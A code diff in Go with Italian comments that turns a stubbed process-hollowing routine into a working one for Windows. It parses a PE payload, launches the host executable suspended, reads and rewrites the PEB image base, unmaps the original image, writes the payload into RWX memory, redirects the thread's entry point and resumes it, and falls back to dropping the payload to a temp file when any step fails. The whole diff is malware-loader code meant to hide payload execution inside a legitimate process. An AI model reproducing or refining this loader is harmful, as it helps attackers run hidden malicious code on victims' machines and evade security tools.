@@ -10,6 +10,7 @@ import (
 	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
+	"encoding/binary"
 	"io"
 	"os"
 	"os/exec"
@@ -39,6 +40,7 @@ var (
 	procCreateProcess   = kernel32.NewProc("CreateProcessW")
 	procVirtualAllocEx  = kernel32.NewProc("VirtualAllocEx")
 	procWriteProcessMem = kernel32.NewProc("WriteProcessMemory")
+	procReadProcessMem  = kernel32.NewProc("ReadProcessMemory")
 	procGetThreadCtx    = kernel32.NewProc("GetThreadContext")
 	procSetThreadCtx    = kernel32.NewProc("SetThreadContext")
 	procResumeThread    = kernel32.NewProc("ResumeThread")
@@ -140,9 +142,39 @@ func removePadding(data []byte, offsets []int) []byte {
 // executeProcessHollowing esegue il payload usando Process Hollowing
 // Tecnica: crea processo sospeso, unmap originale, mappa nuovo PE, resume
 func executeProcessHollowing(payload []byte) {
-	// 1. Crea processo sospeso (usa se stesso come host)
-	exePath, _ := os.Executable()
+	// 1. Parse PE headers
+	if len(payload) < 0x1000 {
+		executeFromTemp(payload)
+		return
+	}
 	
+	// DOS Header check
+	if payload[0] != 'M' || payload[1] != 'Z' {
+		executeFromTemp(payload)
+		return
+	}
+	
+	// Get PE offset
+	peOffset := binary.LittleEndian.Uint32(payload[0x3C:])
+	if peOffset > uint32(len(payload)-4) {
+		executeFromTemp(payload)
+		return
+	}
+	
+	// PE signature check
+	if string(payload[peOffset:peOffset+4]) != "PE\x00\x00" {
+		executeFromTemp(payload)
+		return
+	}
+	
+	// Parse Optional Header
+	optHeaderOffset := peOffset + 24 // sizeof(IMAGE_FILE_HEADER)
+	imageBase := binary.LittleEndian.Uint64(payload[optHeaderOffset+24:])
+	sizeOfImage := binary.LittleEndian.Uint32(payload[optHeaderOffset+56:])
+	addressOfEntryPoint := binary.LittleEndian.Uint32(payload[optHeaderOffset+16:])
+	
+	// 2. Crea processo sospeso
+	exePath, _ := os.Executable()
 	var si syscall.StartupInfo
 	var pi syscall.ProcessInformation
 	si.Cb = uint32(unsafe.Sizeof(si))
@@ -154,51 +186,141 @@ func executeProcessHollowing(payload []byte) {
 		nil,
 		nil,
 		false,
-		0x4, // CREATE_SUSPENDED
+		0x4,
 		nil,
 		nil,
 		&si,
 		&pi,
 	)
 	if err != nil {
-		os.Exit(1)
+		executeFromTemp(payload)
+		return
 	}
 	
-	// 2. Unmap processo originale
-	ntUnmapViewOfSection(pi.Process, getImageBase(payload))
+	// 3. Get thread context per accesso PEB
+	// Full CONTEXT structure (1232 bytes per x64)
+	ctx := make([]byte, 1232)
+	// Set CONTEXT_INTEGER flag (0x00100000 | 0x00000002) at offset 48
+	binary.LittleEndian.PutUint32(ctx[48:], 0x00100002)
 	
-	// 3. Alloca memoria per nuovo PE
-	imageBase := getImageBase(payload)
-	imageSize := getImageSize(payload)
+	ret, _, _ := procGetThreadCtx.Call(
+		uintptr(pi.Thread),
+		uintptr(unsafe.Pointer(&ctx[0])),
+	)
+	if ret == 0 {
+		syscall.TerminateProcess(pi.Process, 1)
+		executeFromTemp(payload)
+		return
+	}
 	
+	// 4. Extract Rdx (pointer to PEB) - offset 136 in CONTEXT
+	Rdx := binary.LittleEndian.Uint64(ctx[136:])
+	
+	// 5. Read actual ImageBase from PEB+16
+	baseAddrBytes := make([]byte, 8)
+	var bytesRead uintptr
+	ret, _, _ = procReadProcessMem.Call(
+		uintptr(pi.Process),
+		uintptr(Rdx+16),
+		uintptr(unsafe.Pointer(&baseAddrBytes[0])),
+		8,
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+	if ret == 0 || bytesRead != 8 {
+		syscall.TerminateProcess(pi.Process, 1)
+		executeFromTemp(payload)
+		return
+	}
+	baseAddr := binary.LittleEndian.Uint64(baseAddrBytes)
+	
+	// 6. Unmap processo originale
+	ret, _, _ = procNtUnmapView.Call(uintptr(pi.Process), uintptr(baseAddr))
+	if ret != 0 {
+		syscall.TerminateProcess(pi.Process, 1)
+		executeFromTemp(payload)
+		return
+	}
+	
+	// 7. Alloca memoria per nuovo PE (prova prima imageBase, poi baseAddr)
 	newBase, _, _ := procVirtualAllocEx.Call(
 		uintptr(pi.Process),
-		imageBase,
-		uintptr(imageSize),
+		uintptr(imageBase),
+		uintptr(sizeOfImage),
 		0x3000, // MEM_COMMIT | MEM_RESERVE
 		0x40,   // PAGE_EXECUTE_READWRITE
 	)
 	
-	// 4. Scrivi headers
-	writeProcessMemory(pi.Process, newBase, payload[:0x1000])
+	if newBase == 0 {
+		syscall.TerminateProcess(pi.Process, 1)
+		executeFromTemp(payload)
+		return
+	}
 	
-	// 5. Scrivi sezioni
-	writeSections(pi.Process, newBase, payload)
+	// 8. Scrivi headers con error check
+	if !writeProcessMemoryChecked(pi.Process, newBase, payload[:0x1000]) {
+		syscall.TerminateProcess(pi.Process, 1)
+		executeFromTemp(payload)
+		return
+	}
 	
-	// 6. Fix relocations e IAT
-	// (implementazione semplificata, vedi goffloader per versione completa)
+	// 9. Scrivi sezioni PE con error check
+	numberOfSections := binary.LittleEndian.Uint16(payload[peOffset+6:])
+	sectionTableOffset := optHeaderOffset + 240 // sizeof(IMAGE_OPTIONAL_HEADER64)
 	
-	// 7. Modifica entry point
-	var ctx context
-	ctx.ContextFlags = 0x10007 // CONTEXT_FULL
-	procGetThreadCtx.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
+	for i := uint16(0); i < numberOfSections; i++ {
+		sectionOffset := sectionTableOffset + (uint32(i) * 40) // sizeof(IMAGE_SECTION_HEADER)
+		if sectionOffset+40 > uint32(len(payload)) {
+			break
+		}
+		
+		virtualAddress := binary.LittleEndian.Uint32(payload[sectionOffset+12:])
+		sizeOfRawData := binary.LittleEndian.Uint32(payload[sectionOffset+16:])
+		pointerToRawData := binary.LittleEndian.Uint32(payload[sectionOffset+20:])
+		
+		if pointerToRawData > 0 && sizeOfRawData > 0 {
+			end := pointerToRawData + sizeOfRawData
+			if end <= uint32(len(payload)) {
+				sectionData := payload[pointerToRawData:end]
+				if !writeProcessMemoryChecked(pi.Process, newBase+uintptr(virtualAddress), sectionData) {
+					syscall.TerminateProcess(pi.Process, 1)
+					executeFromTemp(payload)
+					return
+				}
+			}
+		}
+	}
 	
-	entryPoint := getEntryPoint(payload)
-	ctx.Rcx = newBase + uintptr(entryPoint)
+	// 10. Update PEB con nuovo ImageBase (CRITICO)
+	newBaseBytes := make([]byte, 8)
+	binary.LittleEndian.PutUint64(newBaseBytes, uint64(newBase))
+	var bytesWritten uintptr
+	ret, _, _ = procWriteProcessMem.Call(
+		uintptr(pi.Process),
+		uintptr(Rdx+16), // PEB+16 = ImageBaseAddress
+		uintptr(unsafe.Pointer(&newBaseBytes[0])),
+		8,
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 || bytesWritten != 8 {
+		syscall.TerminateProcess(pi.Process, 1)
+		executeFromTemp(payload)
+		return
+	}
 	
-	procSetThreadCtx.Call(uintptr(pi.Thread), uintptr(unsafe.Pointer(&ctx)))
+	// 11. Modifica RCX (entry point) nel context - offset 128 per x64
+	binary.LittleEndian.PutUint64(ctx[128:], uint64(newBase)+uint64(addressOfEntryPoint))
 	
-	// 8. Resume thread
+	ret, _, _ = procSetThreadCtx.Call(
+		uintptr(pi.Thread),
+		uintptr(unsafe.Pointer(&ctx[0])),
+	)
+	if ret == 0 {
+		syscall.TerminateProcess(pi.Process, 1)
+		executeFromTemp(payload)
+		return
+	}
+	
+	// 12. Resume thread
 	procResumeThread.Call(uintptr(pi.Thread))
 }
 
@@ -222,27 +344,7 @@ func executeFromTemp(payload []byte) {
 	os.Remove(tmpPath)
 }
 
-// Helper per Process Hollowing
-type context struct {
-	ContextFlags uint32
-	_            [6]uint64
-	Rax          uintptr
-	Rcx          uintptr
-	Rdx          uintptr
-	Rbx          uintptr
-	Rsp          uintptr
-	Rbp          uintptr
-	Rsi          uintptr
-	Rdi          uintptr
-	R8           uintptr
-	R9           uintptr
-	R10          uintptr
-	R11          uintptr
-	R12          uintptr
-	R13          uintptr
-	R14          uintptr
-	R15          uintptr
-}
+// Helper functions con error checking
 
 func createProcess(name *uint16, cmdLine *uint16, procAttr, threadAttr *syscall.SecurityAttributes,
 	inheritHandles bool, flags uint32, env *uint16, dir *uint16,
@@ -266,39 +368,16 @@ func createProcess(name *uint16, cmdLine *uint16, procAttr, threadAttr *syscall.
 	return nil
 }
 
-func ntUnmapViewOfSection(process syscall.Handle, base uintptr) {
-	procNtUnmapView.Call(uintptr(process), base)
-}
-
-func writeProcessMemory(process syscall.Handle, base uintptr, data []byte) {
-	procWriteProcessMem.Call(
+func writeProcessMemoryChecked(process syscall.Handle, base uintptr, data []byte) bool {
+	var written uintptr
+	ret, _, _ := procWriteProcessMem.Call(
 		uintptr(process),
 		base,
 		uintptr(unsafe.Pointer(&data[0])),
 		uintptr(len(data)),
-		0,
+		uintptr(unsafe.Pointer(&written)),
 	)
-}
-
-func getImageBase(pe []byte) uintptr {
-	// Parse PE header per ottenere ImageBase
-	// Implementazione semplificata
-	return 0x400000
-}
-
-func getImageSize(pe []byte) uintptr {
-	// Parse PE header per ottenere SizeOfImage
-	return uintptr(len(pe))
-}
-
-func getEntryPoint(pe []byte) uintptr {
-	// Parse PE header per ottenere AddressOfEntryPoint
-	return 0x1000
-}
-
-func writeSections(process syscall.Handle, base uintptr, pe []byte) {
-	// Scrivi ogni sezione PE nel processo
-	// Implementazione semplificata
+	return ret != 0 && written == uintptr(len(data))
 }
 
 func boolToUintptr(b bool) uintptr {
